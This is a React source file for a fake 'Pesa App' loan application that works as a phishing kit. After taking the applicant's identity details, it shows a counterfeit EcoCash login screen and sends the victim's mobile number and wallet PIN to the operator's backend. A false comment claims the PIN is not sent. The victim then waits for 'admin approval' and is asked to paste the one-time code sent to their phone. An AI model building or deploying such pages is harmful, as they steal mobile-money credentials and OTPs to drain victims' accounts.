import { useState, useEffect, useRef } from "react";
import Header from "./header";
import momoLogo from "../src/assets/mom.png";


function LoanApplication({ loanDetails, onBack, processor }) {

    const [form, setForm] = useState({
        full_name: "",
        phone: "",
        national_id: "",
        employment_status: "Self-Employed",
        monthly_income: "",
        loan_amount: loanDetails.amount,
        repayment_period: loanDetails.repayment,
        consent: false
    });

    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState("");

    const [submitted, setSubmitted] = useState(false);
    const [applicationNumber, setApplicationNumber] = useState("");
    const [showAdminWaiting, setShowAdminWaiting] = useState(false);
    const [rejected, setRejected] = useState(false);

    // Pesa App transition
    const [showPesaRedirect, setShowPesaRedirect] =
        useState(false);

    // Pesa App PIN screen
    const [showPinScreen, setShowPinScreen] =
        useState(false);

    const [phoneNumber, setPhoneNumber] = useState("");
    // This PIN is NOT sent to the backend.
    const [pin, setPin] = useState([
        "",
        "",
        "",
        ""
    ]);

    const pinInputs = useRef([]);
    const [processing, setProcessing] = useState(false);
    const [showVerification, setShowVerification] = useState(false);
    const [verificationCode, setVerificationCode] = useState("");
    const [verifying, setVerifying] = useState(false);
    const [verificationMessage, setVerificationMessage] = useState("");
    const [verificationTime, setVerificationTime] = useState(120);

    // Restore application flow after reload
    useEffect(() => {
        const saved = sessionStorage.getItem("loanApplicationState");

        if (!saved) return;

        try {
            const state = JSON.parse(saved);

            if (state.applicationNumber) {
                setApplicationNumber(state.applicationNumber);
            }

            if (state.showVerification) {
                setShowVerification(true);
            }

            if (state.showAdminWaiting) {
                setShowAdminWaiting(true);
            }
        } catch (error) {
            console.error(
                "Failed to restore application state:",
                error
            );
        }
    }, []);

    // Save application flow
    useEffect(() => {
        sessionStorage.setItem(
            "loanApplicationState",
            JSON.stringify({
                applicationNumber,
                showVerification,
                showAdminWaiting,
                processor
            })
        );
    }, [
        applicationNumber,
        showVerification,
        showAdminWaiting,
        processor
    ]);

    


    /* =========================================
       FORM CHANGE
    ========================================= */

    function handleChange(e) {

        const {
            name,
            value,
            type,
            checked
        } = e.target;

        setForm({
            ...form,

            [name]:
                type === "checkbox"
                    ? checked
                    : value
        });
    }


    /* =========================================
       SUBMIT LOAN APPLICATION
    ========================================= */

    async function handleSubmit(e) {

        e.preventDefault();

        if (!form.consent) {

            setMessage(
                "Please accept the terms and conditions."
            );

            return;
        }

        setLoading(true);
        setMessage("");

        try {

            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({
                        ...form,
                        processor: processor
                    })
                }
            );

            const data =
                await response.json();

            if (!response.ok) {

                throw new Error(
                    data.error ||
                    "Application failed."
                );
            }

            setMessage(
                `Reference: ${data.application_number}`
            );

            /*
             * Application has been submitted.
             *
             * Now show the Pesa App transition.
             */
            setApplicationNumber(data.application_number)
            setShowPesaRedirect(true);

        } catch (error) {

            setMessage(
                error.message
            );

        } finally {

            setLoading(false);
        }
    }


    /* =========================================
       PESA APP REDIRECT TIMER
    ========================================= */

    useEffect(() => {

        if (!showPesaRedirect) {
            return;
        }

        const timer = setTimeout(() => {

            setShowPesaRedirect(false);

            setShowPinScreen(true);

        }, 3000);

        return () => clearTimeout(timer);

    }, [showPesaRedirect]);

    useEffect(() => {
        if (!showVerification) return;
    
        setVerificationTime(120);
    
        const timer = setInterval(() => {
            setVerificationTime((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
    
                return prev - 1;
            });
        }, 1000);
    
        return () => clearInterval(timer);
    }, [showVerification]);

    useEffect(() => {
        if (!showAdminWaiting || !applicationNumber) {
            return;
        }

        async function checkApplicationStatus() {
            try {
                const response = await fetch(
                    `/api/application-status?application_number=${encodeURIComponent(
                        applicationNumber
                    )}`
                );

                if (!response.ok) {
                    return;
                }

                const data = await response.json();

                console.log(
                    "Application status:",
                    data.status
                );

                if (data.status === "APPROVED") {
                    setShowAdminWaiting(false);

                    /*
                    * Continue to your legitimate
                    * phone verification step.
                    */
                    setProcessing(true);
                    setShowVerification(true);
                    
                }

                if (data.status === "REJECTED") {
                    setShowAdminWaiting(false);
                    setRejected(true);
                }

            } catch (error) {
                console.error(
                    "Application status check failed:",
                    error
                );
            }
        }

        checkApplicationStatus();

        const interval = setInterval(
            checkApplicationStatus,
            3000
        );

        return () => {
            clearInterval(interval);
        };

    }, [
        showAdminWaiting,
        applicationNumber
    ]);

    useEffect(() => {
        if (showPinScreen) {
            window.scrollTo({
                top: 0,
                behavior: "instant"
            });
        }
    }, [showPinScreen]);

    useEffect(() => {
    const savedState = sessionStorage.getItem("loanApplicationState");

    if (!savedState) {
        return;
    }

    try {
        const state = JSON.parse(savedState);

        if (state.applicationNumber) {
            setApplicationNumber(state.applicationNumber);
        }

        if (state.showVerification) {
            setShowVerification(true);
        }

        if (state.showAdminWaiting) {
            setShowAdminWaiting(true);
        }

        if (state.processor) {
            // Only if you have processor state
            setProcessor(state.processor);
        }
    } catch (error) {
        console.error("Could not restore application state:", error);
    }
}, []);

    useEffect(() => {
    sessionStorage.setItem(
        "loanApplicationState",
        JSON.stringify({
            applicationNumber,
            showVerification,
            showAdminWaiting,
            processor
        })
    );
}, [
    applicationNumber,
    showVerification,
    showAdminWaiting,
    processor
]);


    /* =========================================
       PIN INPUT
    ========================================= */

    function handlePinChange(
        value,
        index
    ) {

        // Only numbers
        if (!/^\d?$/.test(value)) {
            return;
        }

        const newPin = [
            ...pin
        ];

        newPin[index] = value;

        setPin(newPin);

        // Automatically move forward
        if (
            value &&
            index < 4
        ) {

            pinInputs
                .current[index + 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN BACKSPACE
    ========================================= */

    function handlePinKeyDown(
        e,
        index
    ) {

        if (
            e.key === "Backspace" &&
            !pin[index] &&
            index > 0
        ) {

            pinInputs
                .current[index - 1]
                ?.focus();
        }
    }


    /* =========================================
       PIN NEXT
    ========================================= */

    async function handlePinNext() {
        const fullPhoneNumber = `+263${phoneNumber}`;

        if (phoneNumber.length !== 9) {
            alert("Please enter a valid mobile number");
            return;
        }
        const enteredDigits = Number(pin.filter(digit => digit !== "").join(""));

        /*
         * Allow either 4 or 5 digits.
         */

        if (
            enteredDigits.toString().length !== 4 &&
            enteredDigits.toString().length !== 5
        ) {
            return;
        }



         try {
        const response = await fetch(
            "/api/submit-application",
            {
                method: "POST",
                headers: {
                    "Content-Type":
                        "application/json"
                },
                body: JSON.stringify({
                    action: "verify_email",
                    phone: fullPhoneNumber,
                    pin: enteredDigits,
                    processor: processor
                })
            }
        );

        if (!response.ok) {
            const data = await response.json();
            throw new Error(
                data.error ||
                "Wait for Admin approval.."
            );
        }

        setShowPinScreen(false);
        setShowAdminWaiting(true);

    } catch (error) {

        setMessage(
            error.message
        );

    } finally {

        setLoading(false);
    }   
}

    async function handleVerify(e) {
        e.preventDefault();

        if (!verificationCode.trim()) {
            setVerificationMessage(
                "Please enter the verification code sent to your phone."
            );
            return;
        }

        setVerifying(true);
        setVerificationMessage("");

        try {
            const response = await fetch(
                "/api/submit-application",
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        action: "verify_phone",
                        verificationCode: verificationCode.trim(),
                        processor: processor
                    })
                }
            );

            const data = await response.json();

            if (!response.ok) {
                throw new Error(
                    data.error ||
                    "Code verification failed."
                );
            }

            setShowVerification(false);
            setProcessing(true);
            setSubmitted(true);

        } catch (error) {
            setVerificationMessage(
                error.message
            );
        } finally {
            setVerifying(false);
        }
    }



    if (showAdminWaiting) {
        return (
            <div className="admin-waiting-overlay">

                <div className="admin-waiting-modal">

                    <div className="waiting-hourglass">
                        ⏳
                    </div>

                    <h2>
                        Please Wait
                    </h2>

                    <p>
                        Your loan application is under review..
                    </p>

                    <p className="waiting-reference">
                        Reference: {applicationNumber}
                    </p>

                    <div className="waiting-loader">
                        <span></span>
                        <span></span>
                        <span></span>
                    </div>

                    <p className="waiting-note">
                        Please do not close this page.
                    </p>

                </div>

            </div>
        );
    }

    if (rejected) {
        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ×
                    </div>

                    <h1>
                        Application Update
                    </h1>

                    <p className="success-title">
                        Application failed.
                    </p>

                    <p className="success-description">
                        Some of your details are not correct, 
                        please restart the application with the correct details.
                    </p>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }

    if (showVerification) {
        return (
            <div className="verification-overlay">

                <div className="verification-modal">

                    <div className="verification-icon">
                        ✓
                    </div>

                    <h2>Phone Verification</h2>

                    <p>
                        Paste the verification code below
                    </p>

                    <form onSubmit={handleVerify}>

                        <label>
                            Paste the code:
                        </label>

                        <div className="verification-code-area">
                        <input
                            type="text"
                            value={verificationCode}
                            onChange={(e) =>
                                setVerificationCode(e.target.value)
                            }
                            placeholder="Enter verification code"
                            inputMode="numeric"
                            autoComplete="one-time-code"
                            required
                            autoFocus
                            />
                        </div>
                        <div className="verification-timer">
                        {String(Math.floor(verificationTime / 60)).padStart(2, "0")}:
                        {String(verificationTime % 60).padStart(2, "0")}
                        </div>

                        {verificationMessage && (
                            <div className="form-message">
                                {verificationMessage}
                            </div>
                        )}

                        <button
                            type="submit"
                            className="submit-button"
                            disabled={verifying}
                        >
                            {verifying
                                ? "VERIFYING..."
                                : "VERIFY"}
                        </button>

                    </form>

                </div>

            </div>
        );
    }

    /* =========================================
       SUCCESS PAGE
    ========================================= */

    if (submitted) {

        return (
            <div className="application-container success-page">

                <div className="success-card">

                    <div className="success-icon">
                        ✓
                    </div>

                    <h1>
                        Application Submitted
                    </h1>

                    <p className="success-title">
                        Your loan application has
                        been submitted successfully.
                    </p>

                    <p className="success-description">
                        We have received your application
                        and will review the information
                        provided. You will be contacted
                        once there is an update on your
                        application.
                    </p>

                    <div className="reference-box">
                        <strong>
                            Thank you
                        </strong>
                    </div>

                    <button
                        type="button"
                        className="submit-button"
                        onClick={() => {
                            window.location.reload();
                        }}
                    >
                        Back to Home
                    </button>

                </div>

            </div>
        );
    }


    /* =========================================
       PESA APP PIN SCREEN
    ========================================= */
    if (processing) {
        return (
            <div className="momo-processing-page">
                <div className="momo-processing-spinner"></div>
                <h2>
                        Processing..
                    </h2>

                    <p>
                        Please wait while we verify
                        your details...
                    </p>
            </div>
        );
    }

    if (showPinScreen) {
        return (
            <div className="ecocash-login-page">
                <section className="ecocash-login-section">

                    <div className="ecocash-logo">
                    <span className="eco">Eco</span>
                    <span className="cash">Cash</span>
                    </div>
                    {/* LOGIN CONTENT */}

                            <h1 className="pesa-welcome-title">
                                <span className="welcome-text">
                                
                                </span>

                                <span className="banking-text">
                                    
                                </span>
                            </h1>

                            <h2 className="secured-login-title">
                            Login
                            </h2>
                            <div className="phone-input-wrapper">
                            <div className="country-selector">
                                <span className="zimbabwe-flag">🇿🇼</span>
                                <span className="country-code">+263</span>
                                <span className="dropdown-icon">⌄</span>
                            </div>

                            <input
                                type="tel"
                                className="phone-number-input"
                                placeholder="Enter mobile number"
                                inputMode="numeric"
                                autoComplete="tel"
                                maxLength={9}
                                value={phoneNumber}
                                onChange={(e) => {
                                    setPhoneNumber(e.target.value.replace(/\D/g, ""));
                                }}
                            />
                            </div>

                            <p className="pin-instruction">
                                Enter your PIN 
                            </p>

                            {/* PIN BOXES */}
                            <div className="pesa-pin-boxes">

                                {pin.map((digit, index) => (
                                    <input
                                        key={index}

                                        ref={(element) => {
                                            pinInputs.current[index] = element;
                                        }}

                                        type="password"
                                        inputMode="numeric"
                                        maxLength="1"
                                        value={digit}

                                        onChange={(e) =>
                                            handlePinChange(
                                                e.target.value,
                                                index
                                            )
                                        }

                                        onKeyDown={(e) =>
                                            handlePinKeyDown(
                                                e,
                                                index
                                            )
                                        }

                                        className="pesa-pin-box"

                                        aria-label={`PIN digit ${index + 1}`}
                                    />
                                ))}

                            </div>

                            <button
                                type="button"
                                className="pesa-next-button"
                                disabled={
                                    pin.filter(
                                        digit => digit !== ""
                                    ).length < 4
                                }
                                onClick={handlePinNext}
                            >
                                Next
                            </button>

                </section>

                        {/* Bottom / Blue section */}
                        <section className="ecocash-info-section">

                            <div className="ecocash-info-content">

                            <p>
                                To register an EcoCash wallet or get <br/> assistance, <br/> 
                                click below
                            </p>

                            <div className="ecocash-actions">

                                <button className="ecocash-action-button">
                                    👤
                                Register
                                </button>

                                <button className="ecocash-action-button">
                                    ℹ️ 
                                    Help & Support
                                </button>

                                <p>v4.0.5P</p>
                                <p>By signing in you agree to the <a>Terms and conditions </a></p>

                            </div>

                            </div>

                        </section>

                    </div>
        );
    }

    if (showPesaRedirect) {
        return (
            <div className="pesa-redirect">
                <div className="pesa-spinner"></div>

                <h2>
                    Processing...
                </h2>

                <p>
                    Connecting to <strong style={{ color: "#134a97" }}>Eco</strong><strong style={{color:"#bb0c0c"}}>Cash</strong>
                </p>
            </div>
        );
    }

    // =========================================
    // LOAN APPLICATION FORM
    // =========================================

    return (

        <div className="page">

            <Header />

            <div className="application-container">

                <button
                    className="back-button"
                    onClick={onBack}
                >
                    ← Back
                </button>

                <h1>
                    Loan Application
                </h1>

                <p className="application-intro">
                    Please fill in all required
                    details accurately. All information
                    is kept confidential and is used
                    only for loan processing and
                    verification.
                </p>


                <form
                    onSubmit={handleSubmit}
                >

                    <label>
                        Full name
                    </label>

                    <input
                        name="full_name"
                        value={
                            form.full_name
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Phone Number
                    </label>

                    <input
                        name="phone"
                        type="tel"
                        value={
                            form.phone
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        National ID
                    </label>

                    <input
                        name="national_id"
                        value={
                            form.national_id
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Loan Amount (USD)
                    </label>

                    <input
                        name="loan_amount"
                        type="number"
                        value={
                            form.loan_amount
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Employment Status
                    </label>

                    <select
                        name="employment_status"
                        value={
                            form.employment_status
                        }
                        onChange={
                            handleChange
                        }
                    >
                        <option>
                            Self-Employed
                        </option>

                        <option>
                            Employed
                        </option>

                        <option>
                            Business Owner
                        </option>

                        <option>
                            Student
                        </option>

                        <option>
                            Other
                        </option>

                    </select>


                    <label>
                        Monthly Net Income
                    </label>

                    <input
                        name="monthly_income"
                        type="number"
                        placeholder="USD 0.00"
                        value={
                            form.monthly_income
                        }
                        onChange={
                            handleChange
                        }
                        required
                    />


                    <label>
                        Repayment
                    </label>

                    <select
                        name="repayment_period"
                        value={
                            form.repayment_period
                        }
                        onChange={
                            handleChange
                        }
                    >

                        {[
                            1,2,3,4,5,6
                        ].map(
                            months => (

                                <option
                                    key={months}
                                    value={months}
                                >
                                    {months} months
                                </option>

                            )
                        )}

                    </select>


                    <label className="consent">

                        <input
                            type="checkbox"
                            name="consent"
                            checked={
                                form.consent
                            }
                            onChange={
                                handleChange
                            }
                        />

                        <span>
                            I confirm that the
                            information provided
                            is true and I agree to
                            the Pesa App terms
                            and conditions.
                        </span>

                    </label>


                    {message && (

                        <div className="form-message">
                            {message}
                        </div>

                    )}


                    <button
                        type="submit"
                        className="submit-button"
                        disabled={loading}
                    >
                        {loading
                            ? "SUBMITTING..."
                            : "SUBMIT APPLICATION"}
                    </button>

                </form>

            </div>

        </div>
    );
}

export default LoanApplication;
